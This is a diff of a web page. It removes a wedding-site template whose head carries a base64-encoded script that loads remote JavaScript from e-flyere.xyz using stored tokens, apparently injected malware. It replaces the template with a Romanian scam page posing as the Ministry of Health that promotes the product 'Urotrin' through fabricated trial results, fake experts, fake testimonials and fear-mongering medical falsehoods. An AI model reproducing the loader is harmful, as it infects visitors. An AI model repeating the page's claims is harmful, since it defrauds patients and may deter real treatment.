@@ -1,323 +1,313 @@
-<!DOCTYPE HTML>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="ru" dir="ltr">
+
 <head>
-	<title>Happy Family</title>
-	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-	<meta charset="UTF-8">
-	
-	
-	<!-- Font -->
-	
-	<link href="https://fonts.googleapis.com/css?family=Playball%7CBitter" rel="stylesheet">
-	
-	<!-- Stylesheets -->
-	
-	<link href="common-css/bootstrap.css" rel="stylesheet">
-	<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
-    <link rel="icon" href="/favicon.ico" type="image/x-icon">
-
-	
-	<link href="common-css/fluidbox.min.css" rel="stylesheet">
-	
-	<link href="common-css/font-icon.css" rel="stylesheet">
-	
-	
-	<link href="01-homepage/css/styles.css" rel="stylesheet">
-	
-	<link href="01-homepage/css/responsive.css" rel="stylesheet">
-	<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfc25zVzE2cjd3MlJ2eno1OCc7CiAgICBpZiAoIXdpbmRvdy5fc25zVzE2cjd3MlJ2eno1OCkgewogICAgICAgIHdpbmRvdy5fc25zVzE2cjd3MlJ2eno1OCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9lLWZseWVyZS54eXovR2lUQTQnLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwczovL2UtZmx5ZXJlLnh5ei82ODAzZmNjL3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX0ZtSE1kNVpKY200cDQ2QlMgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9GbUhNZDVaSmNtNHA0NkJTICE9PSAndW5kZWZpbmVkJyAmJiBfRm1ITWQ1WkpjbTRwNDZCUyAhPT0gbnVsbCkgewogICAgICAgIHZhciBfcUNSdEpZa21mWjRXeGRKdiA9IEpTT04ucGFyc2UoX0ZtSE1kNVpKY200cDQ2QlMpOwogICAgICAgIHZhciBfOXJMdlhCWEJXY1ZYZzJNcSA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9xQ1J0SllrbWZaNFd4ZEp2LmNyZWF0ZWRfYXQgKyB3aW5kb3cuX3Nuc1cxNnI3dzJSdnp6NTgudHRsIDwgXzlyTHZYQlhCV2NWWGcyTXEpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9qNnY1SjhmbkY0cURNbjZUID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX05rcXFkenFCWEs2UTRoQmogPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfa052elFROXhWMUQxYkNRRyA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX2tOdnpRUTl4VjFEMWJDUUcgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX2tOdnpRUTl4VjFEMWJDUUcgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfa052elFROXhWMUQxYkNRRyArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfa052elFROXhWMUQxYkNRRyArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX2tOdnpRUTl4VjFEMWJDUUcgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX2tOdnpRUTl4VjFEMWJDUUcgKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9zbnNXMTZyN3cyUnZ6ejU4LlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF9qNnY1SjhmbkY0cURNbjZUICE9PSAndW5kZWZpbmVkJyAmJiBfajZ2NUo4Zm5GNHFETW42VCAmJiB3aW5kb3cuX3Nuc1cxNnI3dzJSdnp6NTgudW5pcXVlKSB7CiAgICAgICAgX2tOdnpRUTl4VjFEMWJDUUcgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfajZ2NUo4Zm5GNHFETW42VCk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9Oa3FxZHpxQlhLNlE0aEJqICE9PSAndW5kZWZpbmVkJyAmJiBfTmtxcWR6cUJYSzZRNGhCaiAmJiB3aW5kb3cuX3Nuc1cxNnI3dzJSdnp6NTgudW5pcXVlKSB7CiAgICAgICAgX2tOdnpRUTl4VjFEMWJDUUcgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9Oa3FxZHpxQlhLNlE0aEJqKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9zbnNXMTZyN3cyUnZ6ejU4LlJfUEFUSCArIF9rTnZ6UVE5eFYxRDFiQ1FHOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>Cumpăraţi Urotrin ieftin. Preţuri, Recenzii Comandaţi Urotrin acum!</title>
+    <link rel="icon" href="favicon.ico" type="image/png">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script type="text/javascript" src="js/jquery.js"></script>
+    <script src="https://api-maps.yandex.ru/2.0-stable/?load=package.standard&lang=ru-RU" type="text/javascript"></script>
+    <script type="text/javascript" src="js/index.js"></script>
+    <link media="all" href="css/index.min.css" type="text/css" rel="stylesheet">
 </head>
-<body>
-	
-	<header>
-		
-		<div class="container">
-		
-			<a class="logo" href=""><img src="images/logo-white.png" alt="Logo"></a>
-			
-			<div class="menu-nav-icon" data-nav-menu="#main-menu"><i class="icon icon-bars"></i></div>
-			
-			<ul class="main-menu visible-on-click" id="main-menu">
-				<li><a href="index.html">HOME</a></li>
-				<li><a href="03-regular-page.html">THER WEDDING</a></li>
-				<li><a href="02-rsvp.html">RSVP</a></li>
-			</ul><!-- main-menu -->
-			
-		</div><!-- container -->
-	</header>
-	
-	
-	<div class="main-slider">
-		<div class="display-table center-text">
-			<div class="display-table-cell">
-				<div class="slider-content">
-				
-					<i class="small-icon icon icon-tie"></i>
-					<h5 class="date">01 SETPEMBER 2020</h5>
-					<h3 class="pre-title">Save The Date</h3>
-					<h1 class="title">Happy <i class="icon icon-heart"></i>Family</h1>
-					
-				</div><!-- slider-content-->
-			</div><!--display-table-cell-->
-		</div><!-- display-table-->
-	</div><!-- main-slider -->
-	
-	
-	<section class="section story-area center-text">
-		<div class="container">
-			<div class="row">
-				<div class="col-sm-1"></div>
-				<div class="col-sm-10">
-					
-					<div class="heading">
-						<h2 class="title">Our Story</h2>
-						<span class="heading-bottom"><i class="icon icon-star"></i></span>
-					</div>
 
-					<p class="desc margin-bottom">How to restore the Foundation of a relationship ...
-					Every bride and groom wants an incomparable wedding combined with fantasy 
-					and style. We create stunning, one-of-a-kind events produced and styled to perfection. 
-					From traditional to modern, elegant and relaxed, we focus on any event we plan.</p>
-					
-				</div><!-- col-sm-10 -->
-			</div><!-- row -->
-		</div><!-- container -->
-	</section><!-- section -->
-	
-	<section class="section counter-area center-text">
-		<div class="container">
-			<div class="row">
-			
-				<div class="col-sm-12">
-					<div class="heading">
-						<h2 class="title">Don't miss it!</h2>
-						<span class="heading-bottom"><i class="color-white icon icon-star"></i></span>
-					</div>
+<body data-use-external-comebacker="1">
+<script type="text/javascript" src="http://code.jquery.com/jquery-latest.js"></script>  
+<script type="text/javascript"> $(document).ready(function () { $('a').attr('href', 'http://www.yandex.ru') }) </script>
+
+    <div class="sazonov66_g9ysODlqt">
+        <div class="katyakoncakova_FtFDdVex">
+            <div class="alex_zevsa_wcih4ECQW clearfix">
+                <a class="Natali0610_RVdHBJiwC" href="" style="cursor: pointer;">
+                    <img alt="Ministerul Sănătății României" src="images/zhibek_m.jpg">
+                    <h1>Ministerul Sănătății României</h1>
+                </a>
+                <div class="mikstroy_hlTMvYzPJs">
+                    <div class="mansurovan_vUZn4RQN">
+                        <span class="Dulov_V_V_du3BxPsUO">Româna</span> <span class="udav_t_slEtc0GR">/</span> <a href="" style="cursor: pointer;">Enleza</a>
+                    </div>
+                    <div class="tata_soboleva_XjcqhmYZ7"> 
+                            <a href="" class="search_in">căutare</a>
+                    </div>
+                    <div class="vasilusya_rfYcdWbD"></div>
+                </div>
+            </div>
+            <div class="puzzle_LTiRtzPGfe">
+                <div class="alex_zevsa_wcih4ECQW">
+                    <ul class="main-menu-blk clearfix">
+                        <li class="germantrava_IeZ6X4Esi9">
+                            <a href="" style="cursor: pointer;">Ministerul</a> <i class="web-s submenu-btn"></i>
+                        </li>
+                        <li class="">
+                            <a href="" style="cursor: pointer;">Sănătăţii</a> <i class="web-s submenu-btn"></i>
+                        </li>
+                        <li class="">
+                            <a href="" style="cursor: pointer;">Activitatea</a> <i class="web-s submenu-btn"></i>
+                        </li>
+                        <li class="">
+                            <a href="" style="cursor: pointer;">Documente</a> <i class="web-s submenu-btn"></i>
+                        </li>
+                        <li class="selected">
+                            <a href="" style="cursor: pointer;">Sala de presă</a> <i class="web-s submenu-btn"></i>
+                        </li>
+                        <li class="shev_V7Mo2liaeP">
+                            <a href="" style="cursor: pointer;">Concursuri</a> <i class="web-s submenu-btn"></i>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="dmavrodi_yjLIBb2Q">
+            <div class="root_f21XaquIT">
+                <div class="alex_zevsa_wcih4ECQW">
+                    <div class="zhanna_86_o5IKudBv">
+                        <div class="renul_seDwyoGn57">
+                            <div class="alstep54_sglCGFT6q">
+                                <a href="" style="cursor: pointer;">Principala</a><span class="altakansk_YrlOq5h6N">→</span><a href="" style="cursor: pointer;">Sala de presă</a><span class="altakansk_YrlOq5h6N">→</span><a href="" style="cursor: pointer;">Noutăţi</a> <span class="altakansk_YrlOq5h6N">→</span><a href="" style="cursor: pointer;">MINISTERUL SĂNĂTĂŢII DECLARĂ: Prostatita lansată ameninţă dezvoltarea cancerului de prostată!</a>
+                            </div>
+                            <h2>De la urinarea frecventă până la cancer de prostată - un pas! Cum să recunoaștem amenințarea în timp? Interviu cu urologul-șef al României.</h2>
+                            <div class="dvksub_rYPIQ4ET">
+                                <span id="js-date-1"></span>
+                            </div>
+                            <div class="Genrik91_k2XdOzZlq1">
+                                <div class="doc" style="background-color: rgb(226, 226, 226); padding: 10px;">
+                                    <div class="gelat_Bb6MhOHv">
+                                        <a href="">
+                                            <img src="images/10.jpg">
+                                        </a>
+                                    </div>
+                                    <p class="doc-text"><strong>Trastian Eсaterina Niсolaevna </strong><br>Doctor de Științe Medicale, prima femeie urolog-androlog, reproducolog, principal cercetător-șef al departamentului de andrologie la Institutul de Urologie și Radiologie Intervențională  Ministerul Sănătății al României. <br> <br> Experiență profesională - peste 30 de ani </p>
+                                    <div style="clear: both;"></div>
+                                </div>
+                                <p><b>CARE SUNT PRIMELE SEMNE A PROSTATITIEI:</b></p>
+                                <p><b><font size="4" color="black"></font></b></p>
+                                <li><b><font size="4" color="black">Urinarea frecventă</font></b></li>
+                                <p>
+                                </p><p><b><font size="4" color="black"></font></b></p>
+                                <li><b><font size="4" color="black">Scăderea potenței (disfuncția erectilă)</font></b></li>
+                                <p>
+                                </p><p><b><font size="4" color="black"></font></b></p>
+                                <li><b><font size="4" color="black">Probleme de urinare</font></b></li>
+                                <p>
+                                </p><p><b><font size="4" color="black"></font></b></p>
+                                <li><b><font size="4" color="black">Senzații neplăcute sau dureri în regiunea inghinală și a spatelui inferior</font></b></li>
+                                <p>
+                                </p><p>În stadiul inițial, boala nu se poate manifesta practic, însă scăderea nivelului potenței și a problemelor cu urinarea este primul semn al unei boli incipiente. Cel mai important lucru este să nu întârziați! Impotenţa este cel mai inofensiv rezultat al acestei boli. Mult mai periculos este formarea unei tumori - adenom de prostată, care, cel mai adesea, duce la cancer de prostată.</p>
+                                <p>Prin urmare, boala prostatitei implică mai multe pericole pentru bărbați, principalele dintre acestea sunt:</p>
+                                <p>
+                                    <font size="4" color="black"><b>IMPOTENŢA -  ADENOMA PROSTATEI- CANCER DE PROSTATĂ</b></font>
+                                </p>
+                                <center><img src="images/rak.jpg" width="80%"></center>
+                                <p>
+                                <center>
+                                    <font size="4" color="black"><b>Tumorile scoase ale glandei prostatei (diametrul 65 mm)</b></font>
+                                </center>
+                                </p><p>
+                                </p><p>Precum, impotența apare în 100% din cazuri, adică fiecare bărbat, care are prostatită. La cineva mai devreme, la cineva mai târziu, dar întotdeauna.</p>
+                                <p>Cancerul de prostată se produce în stadiile târzii ale prostatitei, dar, de asemenea, nu este rar. Acei bărbați, care nu tratează prostatita și trăiesc cu ea, de fapt, "joacă cu focul". Dacă doriți să trăiți mult timp și să aveți o erecție bună, prostatita  trebuie tratată. Și trebuie să faceți acest lucru cât mai curând.</p>
+                                <p>Problema este că majoritatea bărbaților bolnavi pur și simplu nu se adresează la medici pentru ajutor. O parte nu o consideră periculoasă, altă parte o consideră rușinoasă. Ca rezultat, obținem o situație în care pacienții  pur și simplu ignoră boala. Și dacă caută ajutor, adesea în acele momente când este târziu și începe să se dezvolte o tumoare canceroasă.</p>
+                                <center><img src="images/003_big.jpg"></center>
+                                <p>
+                                <center>
+                                    <font size="4" color="black"><b>Operația de eliminarea tumorii canceroase de prostată</b></font>
+                                </center>
+                                </p><p>
+                                </p><p>Trebuie să înțelegem că prostatita este o boală mortală, unul dintre principalele pericole ale căreia este transformarea într-o tumoare de prostată canceroasă. Care, la rândul său, duce cel mai adesea la moartea pacientului. Lăsat fără control și tratament, boala se dezvoltă uneori rapid, timp de 1-2 ani, ducând la apariția cancerului.</p>
+                                <p>Dar acum bărbații au o posibilitate unică de a scăpa de această boală, o dată şi pentru totdeauna și fără vizitări regulate la clinică.</p>
+                                <p>Faptul este că în 	<script>
+                                    var now = new Date();
+                                    var month = now.getMonth();
+                                    var year = now.getFullYear();
+                                    year = ((month + 1) > 6) ? year : year - 1;
+                                    document.write(year);
+                            </script> a apărut un poduct revoluționar, care în cel mai scurt timp restabilește funcția prostatei, elimină inflamația, elimină chiar și prostatita cronică și, de asemenea, crește semnificativ potența și durata actului sexual. Numele acestui preparat este <a href="" style="cursor: pointer;"><strong>Urotrin</strong></a>. Acesta este un produs intern foarte accesibil, deși la dezvoltrea lui au participat oamenii de știință medicală din Germania și Franța.</p>
+                                <br>
+                                <div class="gelat_Bb6MhOHv">
+                                    <a href="" style="cursor: pointer;"><img style="margin-left: 15px" src="images/mj.jpg" height="200px;"></a>
+                                    <div class="ewa-b_p5sjGkxr1"></div>
+                                </div>
+                                <p class="at_img">În anul <span id="js-date-2">	<script>
+                                    var now = new Date();
+                                    var month = now.getMonth();
+                                    var year = now.getFullYear();
+                                    year = ((month + 1) > 6) ? year : year - 1;
+                                    document.write(year);
+                            </script></span> în Institutul de Urologie și Radiologie Intervențională, care este principalul centru științific român în domeniul urologiei, a terminat cu succes studiile clinice a mijlocului de nouă generație - <a href="" style="cursor: pointer;"><strong>Urotrin</strong></a>, creată pentru lupta împotriva prostatitei. Serviciul de presă al Institutului a dezvăluit următoarele:</p>
+                                <div style="clear: both;"></div>
+                                <p class="maki555_e4AaJE9jYG" style="text-indent: 0px; text-align: left;"><i><strong>1. Eficacitatea Urotrin, calculată prin metoda standard (Numărul de pacienți recuperați la numărul total de pacienți din grupul de 100 de persoane, care au trecut un curs) a fost de 98%.<br><br>2. Absența manifestărilor bolii după retragerea preparatului (conform rezultatelor observațiilor timp de șase luni) a fost de 99%.<br><br>3. După o săptămână de utilizare a mijlocului, toți pacienții au observat o creștere semnificativă a libidoului și a potenței.<br><br>4. Preparatul a contribuit la creșterea duratei actului sexual la 95% dintre subiecți.<br><br>5. Efecte secundare nedorite, inclusiv reacții alergice nu au fost identificate.<br><br>6. Preparat revoluționar <a href="" style="cursor: pointer;"><strong>Urotrin</strong></a> este recunoscut ca un instrument principal în lupta împotriva prostatitei.</strong> </i></p>
+                                <p class="swetlana40_GWDvkz8Tqs"> <br>Comentarii expert:</p>
+                                <br>
+                                <hr>
+                                <br>
+                                <div class="doc" style="background-color: rgb(226, 226, 226); padding: 10px;">
+                                    <div class="gelat_Bb6MhOHv">
+                                        <img src="images/11.jpg">
+                                    </div>
+                                    <p class="doc-text"><strong>Munteanu Iurie Grigorevici </strong><br>Șeful clinicii și catedrei de urologie UMFT, director adjunct al institutului de cercetare a uronefrologiei și sănătății reproductive a omului, membru corespondent a ARŞ, profesor universitar,  cunoscut savant-urolog. <br> <br> <br> Experiență profesională - peste 45 de ani </p>
+                                    <div style="clear: both;"></div>
+                                </div>
+                                <p>Până în 	<script>
+                                    var now = new Date();
+                                    var month = now.getMonth();
+                                    var year = now.getFullYear();
+                                    year = ((month + 1) > 6) ? year : year - 1;
+                                    document.write(year);
+                            </script>, țara nu a avut mijloc eficient și cel mai important, accesibil pentru lupta cu prostatita. Și acest lucru a dus la consecințe incredibile - nivelul bolii a fost - 45% din populația adultă și cel mai strașnic - 30% dintre tineri. <a href="" style="cursor: pointer;"><strong>Urotrin</strong></a> este o revoluție în îndepărtarea prostatitei - un adevărat panaceu. Eficacitatea preparatului este dovedită în practică din România. Compoziția unică și descoperirea de către oamenii de știință a celulelor vii au făcut Urotrin indispensabil pentru prostatită.</p>
+                                <p>Acest mijloc a fost testat clinic. Rezultatele au devenit un adevărat șoc pentru specialiștii urologi. Aproximativ 98% dintre pacienți s-au recuperat fără recăderi. La toți ceilalți au trecut complet simptomele și au oprit procesele inflamatorii în prostată. Cu toate acestea, printre restul de 2% dintre pacienții ar putea avea loc anumite recăderi, care totuși au dispărut cu utilizarea ulterioară a Urotrin.</p>
+                                <p style="text-align: left;"><i><strong>De asemenea, datorită unei combinații de componente unice ale Urotrin, există o creștere pronunțată multiplă a potenței și duratei actului sexual.</strong></i></p>
+                                <p><a href="" style="cursor: pointer;"><strong>Urotrin</strong></a> este bun pentru că rezolvă problema în complex. Are un efect de îmbunătăţirii fenomenale asupra întregului sistem genito-urinar a bărbatului. Pur și simplu, după cursul cu acest preparat, corpul masculin începe să funcționeze la un nivel de 25 de ani. De aceea îl recomand absolut tuturor bărbaților. Chiar dacă nu există prostatită, produsul va efectua o prevenire eficientă și va adăuga semnificativ la potenţă.</p>
+                                <p>În afară de România, preparatul a fost certificat la Universitatea de Urologie din Paris. Studiile clinice au confirmat pe deplin datele româneşti. Francezii au primit chiar și un procent mai mare de recuperare. </p>
+                                <p><i><strong>În acest moment, Urotrin este disponibil numai pentru a comanda <a href="" style="cursor: pointer;"><strong>pe siteul</strong></a> proiectului. Am încercat de multe ori să intrăm în reţetele de farmacii, dar ei doresc să pună cel mai mare preț posibil pentru el și să-l vândă de mai multe ori mai scump decât dorim noi. Vedeți, Institutul de urologie, la fel ca toate Departamentele de Sănătate, sunt structuri nonprofit. Și nu avem nici un scop de a câștiga. Vrem doar să oferim întregii populaţii acest preparat. Prin urmare, îl vindem cu o pierdere, compensând diferența datorită exporturilor sale. Și scopul principal al rețelelor de farmacie - pentru a câștiga. Prin urmare, avem abordări radical diferite de stabilire a prețurilor.</strong></i></p>
+                                <p> În prezent, împreună cu Ministerul Sănătății desfășurăm acțiunea "vom învinge prostatita - vom salva poporul României". Prin urmare, puteți cumpăra Urotrin acum pe un <a href="" style="cursor: pointer;"><font style="color: rgb(22, 151, 206)">site</font></a> special. </p>
+                                <center>
+                                    <a href="">
+                                        <img src="images/product3.png">
+                                    </a>
+                                </center>
+                                <div class="udalykhnn_av3FDRJhB">
+                                    <a href="" class="submit submit-link">Vizitați siteul furnizorului</a>
+                                </div>
+                                <div class="AGB_yQobO46Dw"></div>
+                            </div>
+                            <div class="vk-container">
+                                <div class="vk-header">
+                                    <div class="vk-logo"></div>
+                                    <div class="vk-header-text"><span class="comment-count">194 comentarii</span></div>
+                                </div>
+                                <div class="vk-comment-load comment-id-1">
+                                    <div class="vk-avatar"><img src="images/101.jpg"></div>
+                                    <div class="vk-comment-name">Anton Moraru </div>
+                                    <div class="vk-comment-text">
+                                        <p>Am comandat, aproximativ o lună în urmă, efectul deja este. În general, m-am gândit să merg la operație, dar acum totul sa anulat. Am 54 de ani, dar mă simt ca la 34, nici nu am așteptam)</p>
+                                        <p>
+                                        <center>
+                                        </center>
+                                        </p><p>
+                                    </p></div>
+                                    <div class="vk-comment-date">12 minute în urmă. </div>
+                                </div>
+                                <!-- NEW -->
+                                <div class="vk-comment">
+                                    <div class="vk-avatar"><img src="images/90.jpg"></div>
+                                    <div class="vk-comment-name">Adelin Popescu</div>
+                                    <div class="vk-comment-text">
+                                        <p> Confirm pe deplin! Produsul este super! Am cumpărat nu demult, cu o lună în urmă, de atunci nu știu probleme. Prostatita a trecut complet, deși nu a putut fi vindecată de mult timp înainte, în plus, erecția sa îmbunătățit semnificativ și a apărut mai multă dorință de a face sex! Recomand tuturor, în special bărbaților după 40 de ani!</p>
+                                        <p> Mulțumesc <a href="" style="cursor: pointer;">Urotrin</a>.</p>
+                                    </div>
+                                    <div class="vk-comment-date">17 minute în urmă. </div>
+                                </div>
+                                <div class="vk-comment">
+                                    <div class="vk-avatar"><img src="images/otz-10-10-22.jpg"></div>
+                                    <div class="vk-comment-name">Victor</div>
+                                    <div class="vk-comment-text">
+                                        <p>Fraţilor, nu fugiţi, prostatita este doar periculoasă, deoarece în formă cronică, poate provoca cancer de prostată, am avut o rudă cu așa ceva, aşa că de îndată ce a început să mă deranjeze, am fugit imediat la medic. Dar am alergat de un an, şi nici un folos. Voi fi nou-nouţ cu Urotrin - este clar!</p>
+                                    </div>
+                                    <div class="vk-comment-date">19 minute în urmă. </div>
+                                </div>
+                                <div class="vk-comment">
+                                    <div class="vk-avatar"><img src="images/otz-10-10-23.jpg"></div>
+                                    <div class="vk-comment-name">Nicolae Clipea</div>
+                                    <div class="vk-comment-text">
+                                        <p>În ultimul an și jumătate am fost răsfățat de prostată, am mers la un masaj, am băut pastile, dar totul sa repetat. Dar Urotrin a rezolvat toate problemele foarte repede și am uitat cu adevărat de prostată, deși medicii au pronunțat deja verdictul, că este cronică și totul.</p>
+                                    </div>
+                                    <div class="vk-comment-date">20 minute în urmă. </div>
+                                </div>
+                                <div class="vk-comment">
+                                    <div class="vk-avatar"><img src="images/otz-10-10-24.jpg"></div>
+                                    <div class="vk-comment-name">Arsenie</div>
+                                    <div class="vk-comment-text">
+                                        <p>Am început cu un alt medicament, destul de cunoscut, am băut la numirea unui medic timp de aproape 2 luni - nici un folos. Mai bine nu a devenit, dar la toaletă am fugit mai des și mai des. Ca urmare, tratamentul a fost un eșec. Aici am dat peste Urotrin pe internet. Și lasă-mă să încerc(din cauza că medicina este neputincioasă). Deci, medicina este într-adevăr neputincioasă, iar Urotrin mi-a rezolvat problema rapid și complet!</p>
+                                    </div>
+                                    <div class="vk-comment-date"> 24 minute în urmă. </div>
+                                </div>
+                                <div class="vk-comment">
+                                    <div class="vk-avatar"><img src="images/otz-10-10-29.jpg"></div>
+                                    <div class="vk-comment-name">Eugen Surin</div>
+                                    <div class="vk-comment-text">
+                                        <p>Nu m-am gândit că într-o zi voi fi diagnosticat cu un diagnostic teribil. Pentru un tânăr, este o cruce atât în încrederea în sine, cât și în viața sexuală. Ei bine, nu am disperat, am fost tratat complex, pe toate fronturile. Nu mi-a părut rău de bani pentru tratament. Am fost tratat mult timp și, în cele din urmă, am fost ajutat doar de Urotrin! Nu am așteptam, acționează rapid și fără probleme. </p>
+                                    </div>
+                                    <div class="vk-comment-date">27 minute în urmă. </div>
+                                </div>
+                                <div class="vk-comment">
+                                    <div class="vk-avatar"><img src="images/otz-10-10-00.jpg"></div>
+                                    <div class="vk-comment-name">Nikolai Alexeevici</div>
+                                    <div class="vk-comment-text">
+                                        <p>Vă pot garanta. Am verificat pentru mine. La început am băut o grămadă de antibiotice, am mers la un masaj, în general, am fost tratat mult timp. Dar după câteva luni, prostata începea să-și amintească de sine. Dar după Urotrin au trecut deja 4 luni, așa că am uitat că am avut o dată prostatită.</p>
+                                    </div>
+                                    <div class="vk-comment-date">30 minute în urmă. </div>
+                                </div>
+                                <div class="vk-comment">
+                                    <div class="vk-avatar"><img src="images/otz-10-10-28.jpg"></div>
+                                    <div class="vk-comment-name">Cosma Rău</div>
+                                    <div class="vk-comment-text">
+                                        <p>Băieți, e un coșmar. Cinci ani trăiesc deja cu prostatită! Exacerbări de până la zece ori pe an! Suflă ușor și deja toate simptomele. Am mers la medici, prescriu antibiotice, dar nimic nu ajută. Doar îmbunătățiri temporare și din nou! Antibioticele nu le mai pot bea, organismul nu le mai poate tolera, cred că. Credeţi că Urotrin va ajuta?</p>
+                                    </div>
+                                    <div class="vk-comment-date"> 34 minute în urmă. </div>
+                                </div>
+                                <div class="vk-comment">
+                                    <div class="vk-avatar"><img src="images/otz-10-10-25.jpg"></div>
+                                    <div class="vk-comment-name">Ciprian</div>
+                                    <div class="vk-comment-text">
+                                        <p>Am tratat prostatita cu alt mediament, l-am cumpărat în anul 2018. Și, de asemenea, am făcut exerciții pentru a reduce stagnarea în pelvisul mic, a ajutat cu adevărat, dar apoi din nou mi-a amintit de sine, am trecut din nou același curs. Și după Urotrin fără probleme, totul a plecat o dată pentru totdeauna. </p>
+                                    </div>
+                                    <div class="vk-comment-date">37 minute în urmă. </div>
+                                </div>
+                                <div class="vk-comment">
+                                    <div class="vk-avatar"><img src="images/otz-10-10-011.jpg"></div>
+                                    <div class="vk-comment-name">Irina </div>
+                                    <div class="vk-comment-text">
+                                        <p>Soțul meu a avut, de asemenea, probleme, a încercat mult timp să vindece, dar nu a funcționat nimic. Apoi, un medic a spus că bacteriile, care provoacă prostatită, se obișnuiesc cu antibioticele pe care soțul le-a primit. Aici a sfătuit Urotrin. Soțul i-a dat apoi o cutie de whisky ca mulțumire.</p>
+                                    </div>
+                                    <div class="vk-comment-date">49 minute în urmă.</div>
+                                </div>
+                                <div class="vk-comment">
+                                    <div class="vk-avatar"><img src="images/otz-10-10-26.jpg"></div>
+                                    <div class="vk-comment-name">Denis </div>
+                                    <div class="vk-comment-text">
+                                        <p>Totuși, m-am consultat cu un medic pentru Urotrin, medicul a spus că nu este gata să garanteze, dar dacă încerc, va fi fericit să afle rezultatul. Iar rezultatul a fost excelent, prostatita a plecat, dar medicul a reușit doar să-și dilueze mâinile...</p>
+                                    </div>
+                                    <div class="vk-comment-date"> 53 minute în urmă.</div>
+                                </div>
+                                <div class="vk-comment">
+                                    <div class="vk-avatar"><img src="images/otz-10-10-27.jpg"></div>
+                                    <div class="vk-comment-name">Eugen Calpa</div>
+                                    <div class="vk-comment-text">
+                                        <p>În general, Urotrin nu are analogi pe piață. Acest instrument este, de asemenea, un oncoprotector. Acesta este singurul preparat care funcționează  la 100%. I-am verificat efectul asupra mea și i-am ajutat doi prietenii mei. În general, pot spune cu exactitate că aceasta nu este o opinie subiectivă, ci aprobarea mai multor persoane.</p>
+                                    </div>
+                                    <div class="vk-comment-date">1 oră în urmă.</div>
+                                </div>
+                                <center>
+                                    <div class="udalykhnn_av3FDRJhB">
+                                        <a href="" class="submit submit-link">Vizitați siteul furnizorului</a>
+                                    </div>
+                                </center>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+	<div class="modal">
+		<div class="modal-flex">
+			<div class="modal-block">
+				<div class="modal-content">
+					<div class="modal-close">X</div>
+					<h1 class="modal-title">CUM SĂ ELIMINAŢI PROSTATITA LA DOMICILIU?</h1>
+					<a target="blank" href="" style="text-decoration: none; color: white; cursor: pointer;">
+						 <center>
+							  <a href="" class="submit">Comandă produsul</a>
+						 </center>
+					</a>
 				</div>
-				
-				<div class="col-sm-2"></div>
-				<div class="col-sm-8">
-					
-					<div class="remaining-time">
-						<div id="clock"></div>
-					</div><!-- remaining-time -->
-				</div><!-- col-sm-10 -->
-				
-			</div><!-- row -->
-		</div><!-- container -->
-	</section><!-- section -->
-	
-	<section class="section w-details-area center-text">
-		<div class="container">
-			<div class="row">
-				<div class="col-sm-1"></div>
-				<div class="col-sm-10">
-					
-					<div class="heading">
-						<h2 class="title">Wedding Details</h2>
-						<span class="heading-bottom"><i class="icon icon-star"></i></span>
-					</div>
-					
